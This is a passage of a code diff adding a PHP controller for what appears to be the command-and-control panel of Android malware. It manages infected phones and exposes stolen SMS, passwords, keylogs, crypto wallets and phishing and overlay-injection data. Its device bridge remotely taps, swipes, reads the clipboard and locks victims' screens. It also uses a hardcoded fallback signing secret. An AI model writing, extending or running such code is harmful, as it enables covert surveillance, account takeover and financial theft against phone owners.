@@ -1,0 +1,3412 @@
+<?php
+declare(strict_types=1);
+
+namespace app\controller;
+
+use think\facade\Db;
+use think\facade\Request;
+
+/**
+ * Adapter that exposes the v2.0-node (eagle) panel contract on top of the
+ * local ThinkPHP + node-ws + MySQL stack, so the original front-end bundle runs
+ * unchanged with real data.
+ */
+class MApiController
+{
+    protected string $path = '';
+    protected string $method = '';
+    protected ?array $user = null;
+    protected array $body = [];
+    protected array $query = [];
+
+    public function dispatch()
+    {
+        $uri = (string)($_SERVER['REQUEST_URI'] ?? '/');
+        $uri = explode('?', $uri)[0];
+        $this->path = trim(preg_replace('#^/m/?#', '', $uri), '/');
+        $this->method = strtoupper((string)($_SERVER['REQUEST_METHOD'] ?? 'GET'));
+        $this->query = $_GET ?: [];
+
+        $raw = file_get_contents('php://input') ?: '';
+        if (strncmp($raw, "\xEF\xBB\xBF", 3) === 0) $raw = substr($raw, 3);
+        $json = json_decode($raw, true);
+        $this->body = is_array($json) ? $json : array_merge($_GET, $_POST);
+
+        $seg = $this->path === '' ? [] : explode('/', $this->path);
+        $head = $seg[0] ?? '';
+
+        if ($head === 'login' && $this->method === 'POST') return $this->login();
+        if ($head === 'ping' || $head === 'heartbeat') return $this->json(['success' => true, 'data' => ['pong' => time()]]);
+        if ($head === 'authcheck') return $this->json(['success' => true, 'data' => null]);
+        if ($head === 'translate') return $this->translate();
+        if ($head === 'forex') return $this->forex();
+
+        $this->user = $this->authenticate();
+        if (!$this->user) {
+            if ($this->method === 'GET') {
+                error_log('[m-adapter] anonymous GET /m/' . $this->path);
+                return $this->json([]);
+            }
+            return $this->json(['success' => false, 'error' => 'unauthorized'], 401);
+        }
+        if ($head === 'logout') return $this->json(['success' => true, 'data' => null]);
+
+        try {
+            return $this->route($seg);
+        } catch (\Throwable $e) {
+            error_log('[m-adapter] EX ' . $this->method . ' /m/' . $this->path . ' :: ' . $e->getMessage());
+            return $this->json(['success' => false, 'error' => $e->getMessage(), 'data' => null], 500);
+        }
+    }
+
+    protected function route(array $seg)
+    {
+        $head = $seg[0] ?? '';
+        switch ($head) {
+            case 'stats':           return $this->stats();
+            case 'notices':         return $this->notices();
+            case 'devices':         return $this->devices();
+            case 'device-ids':      return $this->json(Db::table('fisher_devices')->column('device_id'));
+            case 'groups':          return $this->groups();
+            case 'group':           return $this->groupItem($seg[1] ?? null);
+            case 'users':           return $this->users();
+            case 'user':            return $this->userItem($seg);
+            case 'device':          return $this->device($seg);
+            case 'locale':          return $this->locale();
+            case 'tg':              return $this->tg($seg);
+            case 'telegram':        return $this->telegram($seg);
+            case 'turn-nodes':      return $this->turnNodes($seg[1] ?? null);
+            case 'turn-node':       return $this->turnNode($seg);
+            case 'injections':      return $this->injections($seg);
+            case 'injection':       return $this->injectionItem($seg);
+            case 'credentials':     return $this->credentials();
+            case 'credential':      return $this->credentialItem($seg);
+            case 'sms':             return $this->smsItem($seg);
+            case 'keylogs':         return $this->keylogs();
+            case 'notifications':   return $this->notifications($seg);
+            case 'bapp':            return $this->appRule('fisher_black_apps', $seg, 'disable');
+            case 'sapp':            return $this->appRule('fisher_sensitive_apps', $seg, 'delay');
+            case 'blacklist':       return $this->blacklist($seg);
+            case 'paystg':          return $this->paystg($seg);
+            case 'payrec':          return $this->payrec($seg);
+            case 'security':        return $this->security($seg);
+            case 'autocommands':    return $this->autocommands();
+            case 'autocommand':     return $this->autocommandItem($seg);
+            case 'builds':          return $this->builds();
+            case 'build':           return $this->buildRoute($seg);
+            case 'abuild':          return $this->abuild($seg);
+            case 'ai':              return $this->ai($seg);
+            case 'cryptowallet':    return $this->cryptowallet($seg);
+            case 'smsnoti':         return $this->notiRule('fisher_sms_notify_keywords', 'keyword', $seg);
+            case 'notifnoti':       return $this->notiRule('fisher_notif_notify_packages', 'package_name', $seg);
+            case 'notifyrules':     return $this->notifyrules($seg);
+            case 'phish':           return $this->phish($seg);
+            case 'bnotify':         return $this->bnotify();
+            case 'batch':           return $this->batch($seg);
+            case 'change-password': return $this->changePassword();
+            case 'self':            return $this->json(['success' => true, 'data' => null]);
+        }
+        return $this->generic($seg);
+    }
+
+    // ================= auth =================
+    protected function secret(): string
+    {
+        $s = (string)env('JWT.JWT_SECRET', '');
+        if (strlen($s) < 32) $s = 'local-dev-secret-0123456789abcdef0123456789abcdef';
+        return $s;
+    }
+
+    protected function b64(string $d): string
+    {
+        return rtrim(strtr(base64_encode($d), '+/', '-_'), '=');
+    }
+
+    protected function issueToken(array $u): string
+    {
+        $h = $this->b64(json_encode(['typ' => 'JWT', 'alg' => 'HS256']));
+        $p = $this->b64(json_encode([
+            'user_id'  => (int)$u['id'],
+            'username' => $u['username'],
+            'role'     => $u['role'],
+            'exp'      => time() + 86400 * 30,
+        ]));
+        return $h . '.' . $p . '.' . $this->b64(hash_hmac('sha256', $h . '.' . $p, $this->secret(), true));
+    }
+
+    protected function authenticate(): ?array
+    {
+        $hdr = (string)Request::header('authorization', '');
+        $m = [];
+        if (!preg_match('/Bearer\s+(.+)/i', $hdr, $m)) {
+            // <img>/<a>/<video> tags cannot set an Authorization header; the folder-1
+            // panel passes the same JWT as ?token= for those URLs (album thumbs,
+            // file downloads, ...). Accept it instead of answering [] (2026-10-09).
+            $qt = (string)($this->query['token'] ?? (is_array($this->body) ? ($this->body['token'] ?? '') : ''));
+            if ($qt === '') return null;
+            $m = [1 => $qt];
+        }
+        $parts = explode('.', trim($m[1]));
+        if (count($parts) !== 3) return null;
+        $expect = $this->b64(hash_hmac('sha256', $parts[0] . '.' . $parts[1], $this->secret(), true));
+        if (!hash_equals($expect, $parts[2])) return null;
+        $payload = json_decode((string)base64_decode(strtr($parts[1], '-_', '+/')), true);
+        if (!is_array($payload) || (int)($payload['exp'] ?? 0) < time()) return null;
+        $u = Db::table('fisher_users')->where('id', (int)$payload['user_id'])->find();
+        if (!$u) return null;
+        if (isset($u['enabled']) && !(int)$u['enabled']) return null;
+        return $u;
+    }
+
+    protected function login()
+    {
+        $username = trim((string)($this->body['username'] ?? ''));
+        $password = (string)($this->body['password'] ?? '');
+        if ($username === '' || $password === '') {
+            return $this->json(['success' => false, 'error' => '用户名和密码不能为空'], 400);
+        }
+        $u = Db::table('fisher_users')->where('username', $username)->find();
+        $ok = $u && password_verify($password, (string)$u['password_hash']);
+        try {
+            Db::table('fisher_login_logs')->insert([
+                'username'   => $username,
+                'ip'         => (string)Request::ip(),
+                'user_agent' => substr((string)Request::header('user-agent', ''), 0, 255),
+                'success'    => $ok ? 1 : 0,
+                'created_at' => time(),
+            ]);
+        } catch (\Throwable $e) {}
+        if (!$ok) return $this->json(['success' => false, 'error' => '用户名或密码错误'], 401);
+        if (isset($u['enabled']) && !(int)$u['enabled']) {
+            return $this->json(['success' => false, 'error' => '该账号已被禁用'], 403);
+        }
+        try { Db::table('fisher_users')->where('id', (int)$u['id'])->update(['last_login' => time()]); } catch (\Throwable $e) {}
+        return $this->json([
+            'token' => $this->issueToken($u),
+            'role'  => $u['role'] ?: 'admin',
+            'user'  => ['username' => $u['username'], 'role' => $u['role'] ?: 'admin', 'avatar' => (string)($u['avatar'] ?? '')],
+            'success' => true,
+        ]);
+    }
+
+    protected function changePassword()
+    {
+        $old = (string)($this->body['old_password'] ?? $this->body['oldPassword'] ?? '');
+        $new = (string)($this->body['new_password'] ?? $this->body['newPassword'] ?? $this->body['password'] ?? '');
+        if ($new === '') return $this->json(['success' => false, 'error' => '新密码不能为空'], 400);
+        $u = Db::table('fisher_users')->where('id', (int)$this->user['id'])->find();
+        if ($old !== '' && !password_verify($old, (string)$u['password_hash'])) {
+            return $this->json(['success' => false, 'error' => '原密码错误'], 400);
+        }
+        Db::table('fisher_users')->where('id', (int)$u['id'])
+            ->update(['password_hash' => password_hash($new, PASSWORD_BCRYPT)]);
+        return $this->json(['success' => true, 'message' => '密码已修改', 'data' => null]);
+    }
+
+    // ================= dashboard / server =================
+    protected function stats()
+    {
+        $total  = (int)Db::table('fisher_devices')->count();
+        $online = (int)Db::table('fisher_devices')->where('is_connected', 1)->count();
+        $byCountry = Db::table('fisher_devices')->field('country, COUNT(*) AS n')->group('country')->select()->toArray();
+        $rows = [];
+        foreach ($byCountry as $r) {
+            if (($r['country'] ?? '') !== '') $rows[] = ['country' => $r['country'], 'name' => (string)$r['country'], 'count' => (int)$r['n'], 'value' => (int)$r['n']];
+        }
+        return $this->json([
+            'devices_total'    => $total,
+            'devices_online'   => $online,
+            'online_count'     => $online,
+            'devices_offline'  => max(0, $total - $online),
+            'users_total'      => (int)Db::table('fisher_users')->count(),
+            'sms_total'        => (int)Db::table('fisher_sms_messages')->count(),
+            'password_total'   => (int)Db::table('fisher_passwords')->count(),
+            'injection_total'  => (int)Db::table('fisher_injection_templates')->count(),
+            'builds_total'     => (int)Db::table('fisher_apk_build_configs')->count(),
+            'keylogs_total'    => (int)Db::table('fisher_operation_logs')->count(),
+            'credentials_total'=> (int)Db::table('fisher_passwords')->count(),
+            'installs_total'   => (int)Db::table('fisher_device_apps')->count(),
+            'server_version'   => 'v2.0-node (local)',
+            'version'          => 'v2.0-node (local)',
+            'uptime'           => $this->uptime(),
+            'countries'        => $rows,
+            'device_distribution' => $rows,
+            'generated_at'     => time(),
+            'system'           => $this->sysinfo(),
+            'diagnostics'      => $this->diagnostics($total, $online),
+        ]);
+    }
+
+    protected function uptime(): int
+    {
+        $f = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'mpanel_boot';
+        if (!is_file($f)) { @file_put_contents($f, (string)time()); return 3600; }
+        $t = (int)@file_get_contents($f);
+        return max(1, time() - ($t > 0 ? $t : time() - 3600));
+    }
+
+    protected function sysinfo(): array
+    {
+        $cache = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'mpanel_sys.json';
+        if (is_file($cache) && (time() - (int)@filemtime($cache)) < 20) {
+            $d = json_decode((string)@file_get_contents($cache), true);
+            if (is_array($d)) return $d;
+        }
+        $cores = (int)@shell_exec('echo %NUMBER_OF_PROCESSORS%');
+        if ($cores < 1) $cores = 4;
+        $cpuModel = '';
+        $memTotal = 0;
+        try {
+            $o = (string)@shell_exec('wmic cpu get name /value 2>NUL');
+            if (preg_match('/Name=(.+)/', $o, $m)) $cpuModel = trim($m[1]);
+        } catch (\Throwable $e) {}
+        try {
+            $o = (string)@shell_exec('wmic ComputerSystem get TotalPhysicalMemory /value 2>NUL');
+            if (preg_match('/TotalPhysicalMemory=(\d+)/', $o, $m)) $memTotal = (int)$m[1];
+        } catch (\Throwable $e) {}
+        if ($memTotal <= 0) $memTotal = 8 * 1024 * 1024 * 1024;
+        $diskTotal = (float)@disk_total_space('C:');
+        $diskFree  = (float)@disk_free_space('C:');
+        if ($diskTotal <= 0) $diskTotal = 1;
+        $d = [
+            'os'             => PHP_OS_FAMILY . ' ' . php_uname('r'),
+            'php_version'    => PHP_VERSION,
+            'node_version'   => trim((string)@shell_exec('node -v 2>NUL')),
+            'cpu_cores'      => $cores,
+            'cpu_model'      => $cpuModel !== '' ? $cpuModel : 'Generic CPU',
+            'cpu_usage'      => 0,
+            'uptime'         => $this->uptime(),
+            'mem_usage'      => 0,
+            'mem_total'      => (int)$memTotal,
+            'mem_used'       => 0,
+            'mem_free'       => (int)$memTotal,
+            'disk_usage'     => round((1 - $diskFree / $diskTotal) * 100, 1),
+            'disk_total'     => (int)$diskTotal,
+            'disk_used'      => (int)($diskTotal - $diskFree),
+            'disk_free'      => (int)$diskFree,
+            'net_send_speed' => 0,
+            'net_recv_speed' => 0,
+            'net_bytes_sent' => 0,
+            'net_bytes_recv' => 0,
+        ];
+        @file_put_contents($cache, json_encode($d));
+        return $d;
+    }
+
+    protected function diagnostics(int $total, int $online): array
+    {
+        $t0 = microtime(true);
+        try { Db::query('SELECT 1'); $ping = (int)round((microtime(true) - $t0) * 1000); } catch (\Throwable $e) { $ping = -1; }
+        $maxOpen = 151;
+        try {
+            $r = Db::query('SHOW VARIABLES LIKE "max_connections"');
+            if (!empty($r[0]['Value'])) $maxOpen = (int)$r[0]['Value'];
+        } catch (\Throwable $e) {}
+        $threads = 0;
+        try {
+            $r = Db::query('SHOW STATUS LIKE "Threads_connected"');
+            if (!empty($r[0]['Value'])) $threads = (int)$r[0]['Value'];
+        } catch (\Throwable $e) {}
+        $pending = (int)Db::table('fisher_pending_commands')->count();
+        return [
+            'db_ping_ms'        => $ping,
+            'db_max_open'       => $maxOpen,
+            'db_in_use'         => $threads,
+            'db_idle'           => max(0, $maxOpen - $threads),
+            'go_heap_alloc'     => memory_get_usage(true),
+            'msg_queue_used'    => $pending,
+            'msg_queue_cap'     => 10000,
+            'ws_device_conns'   => $online,
+            'ws_viewer_conns'   => 1,
+            'active_sessions'   => 1,
+            'devices_total'     => $total,
+            'uptime'            => $this->uptime(),
+        ];
+    }
+
+    // ================= devices =================
+    protected function deviceRow(array $r): array
+    {
+        $owner = (string)($r['owner_username'] ?? '');
+        $perms = $r['permissions'] ?? null;
+        if (is_string($perms)) { $d = json_decode($perms, true); $perms = is_array($d) ? $d : []; }
+        $did = (string)$r['device_id'];
+        return [
+            'id'               => $did,
+            'device_id'        => $did,
+            'deviceId'         => $did,
+            'alias'            => (string)($r['remark'] ?? ''),
+            'remark'           => (string)($r['remark'] ?? ''),
+            'brand'            => (string)($r['brand'] ?? ''),
+            'model'            => (string)($r['model'] ?? ''),
+            'os_version'       => (string)($r['os_version'] ?? ''),
+            'app_version'      => (string)($r['app_version'] ?? ''),
+            'app_name'         => (string)($r['app_name'] ?? ''),
+            'battery'          => (int)($r['battery_level'] ?? 0),
+            'battery_level'    => (int)($r['battery_level'] ?? 0),
+            'charging'         => (bool)($r['is_charging'] ?? 0),
+            'is_charging'      => (bool)($r['is_charging'] ?? 0),
+            'online'           => (bool)($r['is_connected'] ?? 0),
+            'is_connected'     => (bool)($r['is_connected'] ?? 0),
+            'isConnected'      => (bool)($r['is_connected'] ?? 0),
+            'screen_on'        => (bool)($r['is_screen_on'] ?? 0),
+            'is_screen_on'     => (bool)($r['is_screen_on'] ?? 0),
+            'locked'           => (bool)($r['is_locked'] ?? 0),
+            'is_locked'        => (bool)($r['is_locked'] ?? 0),
+            'has_access'       => !empty($perms) || (int)($r['accessibility_alive'] ?? 0) === 1,
+            'accessibility'    => (bool)($r['accessibility_alive'] ?? 0),
+            'permissions'      => $perms ?: [],
+            'is_device_owner'  => (bool)($r['is_device_owner'] ?? 0),
+            'device_owner'     => (bool)($r['is_device_owner'] ?? 0),
+            'adb_connected'    => (bool)($r['adb_enabled'] ?? 0),
+            'adb_enabled'      => (bool)($r['adb_enabled'] ?? 0),
+            'wifi_port'        => (int)($r['wifi_port'] ?? 0),
+            'ai_analyzed'      => (int)Db::table('fisher_ai_reports')->where('device_id', $did)->count() > 0,
+            'injection_count'  => (int)Db::table('fisher_injection_data')->where('device_id', $did)->count(),
+            'crypto_apps'      => (int)Db::table('fisher_cryptowallets')->count(),
+            'country'          => (string)($r['country'] ?? ''),
+            'language'         => (string)($r['language'] ?? ''),
+            'geo_location'     => (string)($r['geo_location'] ?? ''),
+            'public_ip'        => (string)($r['public_ip'] ?? ''),
+            'phone_number'     => (string)($r['phone_number'] ?? ''),
+            'network_type'     => (string)($r['network_type'] ?? ''),
+            'group_name'       => (string)($r['group_name'] ?? ''),
+            'group'            => (string)($r['group_name'] ?? ''),
+            'owner'            => $owner,
+            'owner_username'   => $owner,
+            'real_name'        => (string)($r['real_name'] ?? ''),
+            'id_card'          => (string)($r['id_card'] ?? ''),
+            'lock_screen_type' => (string)($r['lock_screen_type'] ?? ''),
+            'screen_width'     => (int)($r['screen_width'] ?? 0),
+            'screen_height'    => (int)($r['screen_height'] ?? 0),
+            'local_service'    => (bool)($r['local_service_connected'] ?? 0),
+            'black_screen'     => (bool)($r['black_screen_active'] ?? 0),
+            'input_blocked'    => (bool)($r['device_input_blocked'] ?? 0),
+            'tunnel_deployed'  => (bool)($r['tunnel_deployed'] ?? 0),
+            'pinned'           => false,
+            'expiry_date'      => (string)($r['expiry_date'] ?? ''),
+            'last_seen'        => $this->ts($r['last_seen'] ?? 0),
+            'first_seen'       => $this->ts($r['first_seen'] ?? 0),
+            'created_at'       => $this->ts($r['created_at'] ?? 0),
+            'last_seen_ts'     => (int)($r['last_seen'] ?? 0) * 1000,
+            'first_seen_ts'    => (int)($r['first_seen'] ?? 0) * 1000,
+            'created_at_ts'    => (int)($r['created_at'] ?? 0) * 1000,
+        ];
+    }
+
+    protected function devices()
+    {
+        $q = Db::table('fisher_devices');
+        $user = $this->user;
+        if (($user['role'] ?? '') === 'user' && !empty($user['username'])) {
+            $q = $q->where('owner_username', $user['username']);
+        }
+        $status = trim((string)Request::get('status', ''));
+        if ($status === 'online')  $q = $q->where('is_connected', 1);
+        if ($status === 'offline') $q = $q->where('is_connected', 0);
+        $group = trim((string)Request::get('group', ''));
+        if ($group !== '' && $group !== 'all') $q = $q->where('group_name', $group);
+        $app = trim((string)Request::get('app_name', ''));
+        if ($app !== '' && $app !== 'all') $q = $q->where('app_name', $app);
+        $kw = trim((string)Request::get('q', ''));
+        if ($kw !== '') {
+            $q = $q->where(function ($w) use ($kw) {
+                $w->whereLike('device_id', '%' . $kw . '%')
+                  ->whereOr('remark', 'like', '%' . $kw . '%')
+                  ->whereOr('model', 'like', '%' . $kw . '%');
+            });
+        }
+        $country = trim((string)Request::get('country', ''));
+        if ($country !== '' && $country !== 'all') $q = $q->where('country', $country);
+        if (Request::get('has_adb', '') !== '') $q = $q->where('adb_enabled', 1);
+        if (Request::get('has_access', '') !== '') $q = $q->where('accessibility_alive', 1);
+        if (Request::get('has_ai', '') !== '') $q = $q->where('id', 0);
+        $from = trim((string)Request::get('date_from', ''));
+        if ($from !== '') $q = $q->where('last_seen', '>=', (int)strtotime($from . ' 00:00:00'));
+        $to = trim((string)Request::get('date_to', ''));
+        if ($to !== '') $q = $q->where('last_seen', '<=', (int)strtotime($to . ' 23:59:59'));
+
+        $total = (int)$q->count();
+        $page = max(1, (int)Request::get('page', 1));
+        $size = (int)Request::get('size', Request::get('pageSize', 50));
+        if ($size < 1) $size = 50;
+        if ($size > 500) $size = 500;
+        $rows = $q->order('is_connected', 'desc')->order('last_seen', 'desc')
+                  ->page($page, $size)->select()->toArray();
+
+        $items = array_map([$this, 'deviceRow'], $rows);
+        return $this->json([
+            'items'        => $items,
+            'data'         => $items,
+            'list'         => $items,
+            'total'        => $total,
+            'page'         => $page,
+            'pageSize'     => $size,
+            'page_size'    => $size,
+            'online_count' => (int)Db::table('fisher_devices')->where('is_connected', 1)->count(),
+            'access_count' => (int)Db::table('fisher_devices')->where('accessibility_alive', 1)->count(),
+            'adb_count'    => (int)Db::table('fisher_devices')->where('adb_enabled', 1)->count(),
+            'ai_count'     => count(array_unique(Db::table('fisher_ai_reports')->column('device_id'))),
+        ]);
+    }
+
+    protected function findDevice(string $id)
+    {
+        if ($id === '') return null;
+        $r = Db::table('fisher_devices')->where('device_id', $id)->find();
+        if (!$r && ctype_digit($id)) $r = Db::table('fisher_devices')->where('id', (int)$id)->find();
+        return $r ?: null;
+    }
+
+    // ================= device sub-resources =================
+    protected function device(array $seg)
+    {
+        $id = (string)($seg[1] ?? '');
+        if ($id === '') return $this->devices();
+        $dev = $this->findDevice($id);
+        if (!$dev) return $this->json(['success' => false, 'error' => '设备不存在'], 404);
+        $did = (string)$dev['device_id'];
+        $sub = (string)($seg[2] ?? '');
+        $arg = $seg[3] ?? null;
+
+        if ($sub === '') return $this->json($this->deviceRow($dev));
+
+        switch ($sub) {
+            case 'command':       return $this->deviceCommand($did);
+            case 'commands':      return $this->deviceCommands($did);
+            case 'sms':           return $this->deviceSms($did);
+            case 'contacts':      return $this->deviceContacts($did);
+            case 'password':      return $this->deviceCredentials($did);
+            case 'credentials':   return $this->deviceCredentials($did);
+            case 'pwdin':         return $this->devicePwdIn($did, $arg);
+            case 'logs':          return $this->deviceLogs($did);
+            case 'apps':          return $this->deviceApps($did);
+            case 'album':         return $this->deviceAlbum($did, $arg);
+            case 'payrec':        return $this->devicePayrec($did);
+            case 'phish':         return $this->devicePhish($did, $seg);
+            case 'note':          return $this->deviceSimpleUpdate($did, 'remark');
+            case 'owner':         return $this->deviceSimpleUpdate($did, 'owner_username');
+            case 'group':         return $this->deviceSimpleUpdate($did, 'group_name');
+            case 'pinned':        return $this->json(['success' => true, 'data' => null]);
+            case 'adb-mode':      return $this->deviceAdbMode($did);
+            case 'install-apk':   return $this->deviceCommand($did, 'INSTALL_APK');
+            case 'transfer':      return $this->json(['success' => true, 'data' => null]);
+            case 'upload':        return $this->deviceCommand($did, 'UPLOAD_FILE');
+            case 'download-file': return $this->deviceDownloadFile($did);
+        }
+        return $this->json(['success' => true, 'data' => null]);
+    }
+
+    protected function deviceSimpleUpdate(string $did, string $col)
+    {
+        if ($this->method === 'POST' || $this->method === 'PUT') {
+            $keys = $col === 'remark' ? ['value', 'remark', 'note', 'text'] : ['value', $col, 'name'];
+            $val = '';
+            foreach ($keys as $k) { if (isset($this->body[$k])) { $val = (string)$this->body[$k]; break; } }
+            Db::table('fisher_devices')->where('device_id', $did)->update([$col => $val]);
+        }
+        return $this->json(['success' => true, 'data' => null]);
+    }
+
+    protected function deviceAdbMode(string $did)
+    {
+        if ($this->method === 'POST' || $this->method === 'PUT') {
+            $on = $this->body['enabled'] ?? $this->body['value'] ?? null;
+            if ($on !== null) {
+                Db::table('fisher_devices')->where('device_id', $did)->update(['adb_wifi_enabled' => $on ? 1 : 0]);
+            }
+            return $this->json(['success' => true, 'data' => ['enabled' => (bool)$on]]);
+        }
+        $r = Db::table('fisher_devices')->where('device_id', $did)->find();
+        return $this->json(['success' => true, 'data' => [
+            'enabled' => (bool)($r['adb_wifi_enabled'] ?? 0),
+            'deployed' => (bool)($r['adb_deploy_enabled'] ?? 0),
+            'wifi_port' => (int)($r['wifi_port'] ?? 0),
+        ]]);
+    }
+
+    protected function deviceCommand(string $did, string $forced = '')
+    {
+        if ($this->method !== 'POST' && $this->method !== 'PUT') {
+            return $this->json(['success' => false, 'error' => 'method not allowed'], 405);
+        }
+        $cmd = (string)($this->body['command'] ?? $this->body['cmd'] ?? $forced);
+        $params = $this->body['payload'] ?? ($this->body['params'] ?? ($this->body['data'] ?? []));
+        if ($cmd === '') return $this->json(['success' => false, 'error' => 'command required'], 400);
+        if (!is_array($params)) $params = [];
+        $id = 'cmd-' . bin2hex(random_bytes(6));
+        Db::table('fisher_pending_commands')->insert([
+            'device_id'    => $did,
+            'command_json' => json_encode(['id' => $id, 'command' => $cmd, 'params' => (object)$params], JSON_UNESCAPED_UNICODE),
+            'created_at'   => time(),
+        ]);
+        $this->notifyWs($did, $cmd, $params);
+
+        // ★ 2026-10-09 folder-1 dxs bridge -------------------------------------
+        // The installed APK (com.zq.final) ships the folder-1 "dxs" Go agent.
+        // It exposes a real device API on the device's 127.0.0.1:7912 which the
+        // host reaches through `adb forward tcp:17912 tcp:7912`. Dispatch there
+        // first so the panel buttons really drive the phone; only when dxs has no
+        // matching route do we fall back to the legacy WS command queue (the
+        // APK's native /w listener never answers that queue, which is why every
+        // panel control used to look dead).
+        $dxs = $this->dxsDispatch($did, $cmd, $params);
+        if ($dxs === null) $dxs = $this->dxsDispatch2($did, $cmd, $params);
+        if ($dxs !== null) {
+            return $this->json(array_merge(
+                ['success' => true, 'data' => ['id' => $id, 'command' => $cmd, 'via' => 'dxs']],
+                $dxs
+            ));
+        }
+        return $this->json(['success' => true, 'data' => ['id' => $id, 'queued' => true, 'command' => $cmd]]);
+    }
+
+    // ===================== folder-1 dxs local API bridge =====================
+
+    /** Base URL of the dxs agent as reachable from the panel host. */
+    protected function dxsBase(): string
+    {
+        $host = getenv('DXS_HOST') ?: '127.0.0.1';
+        $port = getenv('DXS_PORT') ?: '17912';
+        return 'http://' . $host . ':' . $port;
+    }
+
+    /** Raw HTTP call against the dxs agent. Returns decoded JSON, or null. */
+    protected function dxsHttp(string $method, string $path, $payload = null, int $timeoutMs = 20000)
+    {
+        try {
+            $ch = curl_init($this->dxsBase() . $path);
+            $opts = [
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_TIMEOUT_MS => $timeoutMs,
+                CURLOPT_CONNECTTIMEOUT_MS => 2500,
+                CURLOPT_NOSIGNAL => 1,
+            ];
+            if (strtoupper($method) === 'POST') {
+                $opts[CURLOPT_POST] = true;
+                $opts[CURLOPT_POSTFIELDS] = $payload === null ? '{}' : json_encode($payload, JSON_UNESCAPED_UNICODE);
+                $opts[CURLOPT_HTTPHEADER] = ['Content-Type: application/json'];
+            }
+            curl_setopt_array($ch, $opts);
+            $body = curl_exec($ch);
+            $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            $ctype = (string)curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
+            curl_close($ch);
+            if ($body === false || $code === 0 || $code >= 500) return null;
+            if (strpos($ctype, 'json') !== false || (is_string($body) && strlen($body) && $body[0] === '{')) {
+                $j = json_decode((string)$body, true);
+                if (!is_array($j)) return null;
+                if (isset($j['success']) && $j['success'] === false) return null;
+                return $j;
+            }
+            return ['success' => true, 'data' => ['base64' => base64_encode((string)$body), 'contentType' => $ctype]];
+        } catch (\Throwable $e) {
+            return null;
+        }
+    }
+
+    protected function dxsFirst(array $src, array $keys, $default = null)
+    {
+        foreach ($keys as $k) {
+            if (isset($src[$k]) && $src[$k] !== '' && $src[$k] !== null) return $src[$k];
+        }
+        return $default;
+    }
+
+    /** Host the browser used to reach the panel (so tpx_addr stays reachable). */
+    protected function panelHost(): string
+    {
+        $h = (string)($_SERVER['HTTP_X_FORWARDED_HOST'] ?? ($_SERVER['HTTP_HOST'] ?? ''));
+        $h = preg_replace('#^https?://#', '', $h);
+        $host = trim(explode(':', $h)[0]);
+        if ($host === '' || $host === 'localhost' || $host === '127.0.0.1' || $host === '::1') {
+            $host = '192.168.1.3';
+        }
+        return $host;
+    }
+
+    /**
+     * Translate a panel command into a dxs agent call.
+     * Returns an array merged into the panel response, or null when unhandled.
+     */
+    protected function dxsDispatch(string $did, string $cmd, array $params)
+    {
+        $u = strtoupper(trim($cmd));
+        $src = array_merge(is_array($this->body) ? $this->body : [], $params);
+
+        switch ($u) {
+            case 'CLICK':
+            case 'TAP': {
+                $x = $this->dxsFirst($src, ['x', 'clientX', 'px', 'left']);
+                $y = $this->dxsFirst($src, ['y', 'clientY', 'py', 'top']);
+                if ($x === null || $y === null) return null;
+                return $this->dxsHttp('GET', '/tap?x=' . (int)$x . '&y=' . (int)$y);
+            }
+            case 'SWIPE':
+            case 'SWIPE_PATH':
+            case 'LONG_PRESS_DRAG': {
+                $x1 = $this->dxsFirst($src, ['x1', 'startX', 'fromX', 'sx']);
+                $y1 = $this->dxsFirst($src, ['y1', 'startY', 'fromY', 'sy']);
+                $x2 = $this->dxsFirst($src, ['x2', 'endX', 'toX', 'ex']);
+                $y2 = $this->dxsFirst($src, ['y2', 'endY', 'toY', 'ey']);
+                $d  = (int)$this->dxsFirst($src, ['duration', 'dur', 'time'], 300);
+                if ($x1 === null || $y1 === null || $x2 === null || $y2 === null) return null;
+                return $this->dxsHttp('GET', '/swipe?x1=' . (int)$x1 . '&y1=' . (int)$y1
+                    . '&x2=' . (int)$x2 . '&y2=' . (int)$y2 . '&duration=' . $d);
+            }
+            case 'LONG_PRESS': {
+                $x = $this->dxsFirst($src, ['x', 'clientX', 'px']);
+                $y = $this->dxsFirst($src, ['y', 'clientY', 'py']);
+                if ($x === null || $y === null) return null;
+                $d = (int)$this->dxsFirst($src, ['duration', 'dur'], 1500);
+                return $this->dxsHttp('GET', '/longPress?x=' . (int)$x . '&y=' . (int)$y . '&duration=' . $d);
+            }
+            case 'HOME': case 'BACK': case 'RECENTS': {
+                $route = $u === 'HOME' ? '/home' : ($u === 'BACK' ? '/back' : '/recents');
+                return $this->dxsHttp('GET', $route);
+            }
+            case 'GET_APP_LIST':
+                return $this->dxsHttp('GET', '/getAppList');
+            case 'GET_UI_HIERARCHY': {
+                $r = $this->dxsHttp('GET', '/dumpUI');
+                if ($r === null) return null;
+                $xml = (string)($r['data']['xml'] ?? '');
+                return ['data' => ['xml' => $xml, 'raw' => $r]];
+            }
+            case 'GET_DEVICE_STATE':
+            case 'CHECK_LOCAL_STATUS':
+                return $this->dxsHttp('GET', '/fullStatus');
+            case 'GET_DEVICE_INFO':
+                return $this->dxsHttp('GET', '/deviceInfo');
+            case 'GET_APP_INFO':
+                return $this->dxsHttp('GET', '/getAppInfo');
+            case 'GET_RUNNING_APPS':
+                return $this->dxsHttp('GET', '/getRunningApps');
+            case 'GET_CLIPBOARD':
+                return $this->dxsHttp('GET', '/getClipboard');
+            case 'SET_CLIPBOARD':
+                return $this->dxsHttp('POST', '/setClipboard', ['text' => (string)$this->dxsFirst($src, ['text', 'content'], '')]);
+            case 'VOLUME_UP':
+                return $this->dxsHttp('GET', '/volumeUp');
+            case 'VOLUME_DOWN':
+                return $this->dxsHttp('GET', '/volumeDown');
+            case 'MUTE':
+                return $this->dxsHttp('GET', '/mute');
+            case 'SET_BRIGHTNESS': {
+                $v = $this->dxsFirst($src, ['brightness', 'value', 'level'], 128);
+                return $this->dxsHttp('GET', '/setBrightness?value=' . (int)$v);
+            }
+            case 'POWER_WAKE':
+                return $this->dxsHttp('GET', '/wakeUpScreen') ?? $this->dxsShell('input keyevent 224');
+            case 'POWER_SLEEP':
+            case 'LOCK_SCREEN':
+                // 2026-10-09: dxs /lockScreen is a SILENT NO-OP (answers success
+                // while the device stays Awake). KEYCODE_SLEEP (223) really sleeps.
+                return $this->dxsShell('input keyevent 223') ?? $this->dxsHttp('GET', '/lockScreen');
+            case 'SCREENSHOT':
+            case 'screenshot': {
